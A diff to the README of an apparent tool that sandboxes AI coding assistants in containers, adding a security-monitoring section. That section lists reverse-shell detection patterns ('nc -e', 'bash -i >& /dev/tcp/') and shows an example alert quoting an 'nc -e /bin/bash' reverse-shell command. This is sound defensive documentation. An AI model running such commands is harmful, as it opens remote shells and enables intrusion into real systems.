@@ -16,6 +16,8 @@ Run AI coding assistants (Claude Code, Aider, and more) in isolated, production-
 
 **Security First:** Unlike Docker or bare-metal execution, your environment variables, SSH keys, and Git credentials are **never** exposed to AI tools. Containers run in complete isolation with no access to your host credentials unless explicitly mounted.
 
+**Proactive Defense:** COI doesn't just isolate AI tools — it actively watches them. A built-in security monitoring daemon detects reverse shells, credential scanning, and large data reads in real time, automatically pausing or killing the container before damage can occur. No manual intervention needed.
+
 *Think Docker for AI coding tools, but with system containers that actually work like real machines.*
 
 ![Demo](misc/demo.gif)
@@ -34,6 +36,7 @@ Run AI coding assistants (Claude Code, Aider, and more) in isolated, production-
 - [System Health Check](https://github.com/mensfeld/code-on-incus/wiki/System-Health-Check)
 - [Container Lifecycle & Session Persistence](https://github.com/mensfeld/code-on-incus/wiki/Container-Lifecycle-and-Sessions)
 - [Network Isolation](https://github.com/mensfeld/code-on-incus/wiki/Network-Isolation)
+- [Security Monitoring](#security-monitoring)
 - [Resource and Time Limits](https://github.com/mensfeld/code-on-incus/wiki/Resource-and-Time-Limits)
 - [Security Best Practices](https://github.com/mensfeld/code-on-incus/wiki/Security-Best-Practices)
 - [Troubleshooting](https://github.com/mensfeld/code-on-incus/wiki/Troubleshooting)
@@ -68,6 +71,7 @@ The tool abstraction layer makes it easy to add support for new AI coding assist
 - Project separation - Complete isolation between workspaces
 - Credential protection - No risk of SSH keys, `.env` files, or Git credentials being exposed to AI tools
 - Network isolation - Built-in firewalld limits block private network access and prevent data exfiltration (restricted/allowlist modes)
+- **Real-time security monitoring** - Always-on threat detection for reverse shells, data exfiltration, and environment scanning with automated response
 
 **Safe Dangerous Operations**
 - AI coding tools often need broad filesystem access or bypass permission checks
@@ -232,13 +236,25 @@ For users who prefer to verify each step or cannot use the automated installer:
 
 If you prefer to build from source or need a specific version:
 
+**Build Dependencies:**
 ```bash
-# Prerequisites: Go 1.24.4 or later
+# Required: Go 1.24.4 or later
+sudo apt-get install golang-go
+
+# Optional: For NFT network monitoring support
+# (Not needed if you only use process/filesystem monitoring)
+sudo apt-get install libsystemd-dev
+```
+
+**Build and Install:**
+```bash
 git clone https://github.com/mensfeld/code-on-incus.git
 cd code-on-incus
 make build
 sudo make install
 ```
+
+**Note:** If you don't have `libsystemd-dev` installed, the build will still succeed but NFT network monitoring features won't be available. Process monitoring, filesystem monitoring, and all core features will work normally.
 
 **Post-Install Setup:**
 
@@ -352,7 +368,7 @@ coi kill coi-abc12345-1
 # Kill all containers
 coi kill --all
 
-# Cleanup stopped/orphaned containers
+# Cleanup stopped containers and orphaned resources (veths, firewall rules, zone bindings)
 coi clean
 
 # Execute commands in containers with PTY support
@@ -577,6 +593,24 @@ coi shell --network=allowlist  # Allowlist mode
 coi shell --network=open       # Open mode
 ```
 
+**Docker Registry Access:**
+
+Docker registries (docker.io, ghcr.io, etc.) are accessible in **restricted mode** by default. In **allowlist mode**, you'll need to add registry domains to your allowlist:
+
+```bash
+# For Docker Hub
+coi config set network.allowlist "registry-1.docker.io,auth.docker.io,production.cloudflare.docker.com"
+
+# Or use open mode for the session
+coi shell --network=open
+```
+
+The `code` user has **passwordless sudo** access, so Docker commands work without password prompts:
+```bash
+sudo docker pull alpine
+sudo docker run -it alpine sh
+```
+
 **Accessing container services from host:**
 ```bash
 coi list  # Get container IP
@@ -584,6 +618,128 @@ curl http://<container-ip>:3000
 ```
 
 **Note:** Network isolation requires firewalld. Use `--network=open` or see the guide for firewalld setup instructions.
+
+## Security Monitoring
+
+`coi` includes **always-on security monitoring** to detect and respond to malicious behavior in real-time. The monitoring daemon runs automatically during sessions and protects against:
+
+**Threat Detection:**
+- **Reverse shells** - Detects `nc -e`, `bash -i >& /dev/tcp/`, Python/Perl/Ruby reverse shell patterns
+- **Data exfiltration** - Monitors large workspace reads that may indicate code theft attempts
+- **Environment scanning** - Flags processes searching for API keys, secrets, and credentials
+- **Network threats (NFT)** - Real-time kernel-level detection of:
+  - Connections to private networks (RFC1918)
+  - Cloud metadata endpoint access (169.254.169.254)
+  - Suspicious ports (4444, 5555, 31337 - common C2/backdoor ports)
+  - Allowlist violations
+  - DNS query anomalies (tunneling, unexpected servers)
+  - Short-lived connections (<2s) missed by polling
+
+**Automated Response:**
+- **INFO**: Logged for review
+- **WARNING**: Logged + displayed as alert
+- **HIGH**: Logged + alert + **container paused** (requires manual resume)
+- **CRITICAL**: Logged + alert + **container killed immediately**
+
+**View Real-Time Monitoring:**
+```bash
+# Monitor a running container
+coi monitor coi-abc-1
+
+# Watch mode (updates every 2 seconds)
+coi monitor coi-abc-1 --watch 2
+
+# JSON output for scripting
+coi monitor coi-abc-1 --json
+```
+
+**Review Audit Log:**
+```bash
+# View all security events
+coi monitor audit coi-abc-1
+
+# Filter by severity
+coi monitor audit coi-abc-1 --level=critical,high
+
+# Export for analysis
+coi monitor audit coi-abc-1 --export=report.json
+```
+
+**Example Alert:**
+```
+⚠ SECURITY ALERT [CRITICAL]
+Reverse shell detected
+
+Process 'nc -e /bin/bash 192.168.1.100 4444' (PID 1235) matches reverse shell pattern 'nc -e'
+
+→ Action taken: killed
+→ Logged to audit: ~/.coi/audit/coi-abc-1.jsonl
+```
+
+**Configuration:**
+```toml
+# ~/.config/coi/config.toml
+[monitoring]
+enabled = true                    # Enable/disable monitoring
+auto_pause_on_high = true        # Pause on high-severity threats
+auto_kill_on_critical = true     # Kill on critical threats
+poll_interval_sec = 2            # Monitoring frequency
+file_read_threshold_mb = 50.0    # MB read before alerting
+file_read_rate_mb_per_sec = 10.0 # Sustained read rate threshold
+audit_log_retention_days = 30    # Audit log retention
+
+[monitoring.nft]
+enabled = true                   # Enable nftables network monitoring
+rate_limit_per_second = 100      # Log volume limit
+dns_query_threshold = 100        # Alert on >N DNS queries/min
+log_dns_queries = true           # Separate DNS logging
+lima_host = ""                   # For macOS: "lima-default"
+```
+
+**Audit logs** are stored at `~/.coi/audit/<container-name>.jsonl` in JSON Lines format for forensics and compliance.
+
+### NFT Network Monitoring Setup
+
+NFT monitoring requires additional system dependencies. Install them with:
+
+```bash
+# Run the setup script (requires sudo)
+./scripts/install-nft-deps.sh
+
+# Or manually:
+sudo apt-get install -y libsystemd-dev nftables
+sudo usermod -a -G systemd-journal $USER
+
+# Create sudoers file for nftables
+sudo tee /etc/sudoers.d/coi <<'EOF'
+%incus-admin ALL=(ALL) NOPASSWD: /usr/sbin/nft list *
+%incus-admin ALL=(ALL) NOPASSWD: /usr/sbin/nft add rule *
+%incus-admin ALL=(ALL) NOPASSWD: /usr/sbin/nft delete rule *
+%incus-admin ALL=(ALL) NOPASSWD: /usr/sbin/nft -a list *
+EOF
+sudo chmod 0440 /etc/sudoers.d/coi
+
+# IMPORTANT: Log out and log back in for group membership to take effect
+# Or run: newgrp systemd-journal
+```
+
+**Verify setup:**
+```bash
+# Check NFT monitoring status
+coi health
+
+# Test journal access
+journalctl -k -n 10
+
+# Test nftables access
+sudo -n nft list ruleset
+```
+
+**Required packages:**
+- `libsystemd-dev` - systemd development headers for journald integration
+- `nftables` - kernel-level packet filtering for network monitoring
+- systemd-journal group membership - read kernel logs without sudo
+- Passwordless sudo for nft commands - add/remove rules without prompts
 
 ## Security Best Practices
 
